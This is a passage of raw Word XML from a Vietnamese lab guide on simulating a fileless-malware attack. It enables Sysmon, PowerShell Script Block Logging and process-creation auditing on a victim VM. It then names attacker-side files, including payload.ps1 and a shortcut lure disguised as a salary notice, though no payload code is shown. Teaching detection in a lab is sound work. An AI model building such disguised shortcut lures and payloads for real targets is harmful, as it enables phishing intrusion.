        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Sysmon</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">          Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Event quan trọng trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sysmon Event ID 1: Process Creation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sysmon Event ID 3: Network Connection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sysmon Event ID 11: File Create.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Cài hoặc bật gpedit.msc nếu máy không có</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Một số bản Windows Home không có sẵn Local Group Policy Editor. Nếu bấm </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Win + R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, gõ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> mà báo không tìm thấy, mở CMD bằng quyền Administrator và chạy lần lượt hai lệnh sau:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FOR %i IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%i")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FOR %i IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientFolder-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%i")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau khi chạy xong, thử mở lại:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Win + R</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nếu vẫn chưa mở được, restart máy ảo victim rồi kiểm tra lại.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Bật PowerShell Script Block Logging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim, mở:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Win + R</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đi tới:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Computer Configuration</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Administrative Templates</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Windows Components</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows PowerShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mở:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Turn on PowerShell Script Block Logging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chọn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cập nhật policy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gpupdate /force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Log cần xem:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        PowerShell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">          Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Event quan trọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell Event ID 4104: nội dung script được PowerShell xử lý.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu không dùng được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, có thể bật bằng PowerShell Administrator:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1 -Type DWord</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Bật Process Creation Audit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mở PowerShell Administrator trên victim:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>auditpol /set /subcategory:"Process Creation" /success:enable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>auditpol /get /subcategory:"Process Creation"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Log cần xem:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Windows Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Security</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Event ID 4688</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu muốn Security Event 4688 có cả command line, mở </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Computer Configuration</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Administrative Templates</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    System</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Audit Process Creation</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Include command line in process creation events</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chọn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau đó chạy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gpupdate /force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Bật hiển thị file extension trên victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Vì bài lab có file ZIP và shortcut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, cần bật hiển thị phần mở rộng file để dễ quan sát và chụp ảnh báo cáo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên Windows 11:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>File Explorer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  View</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Show</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      File name extensions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên Windows 10:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>File Explorer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  View</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    File name extensions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Tạo thư mục lab trên attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Trên máy attacker </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, mở PowerShell:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mkdir C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd C:\Fileless-Lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Các file chính trong thư mục này:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  create_lnk.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:br/>
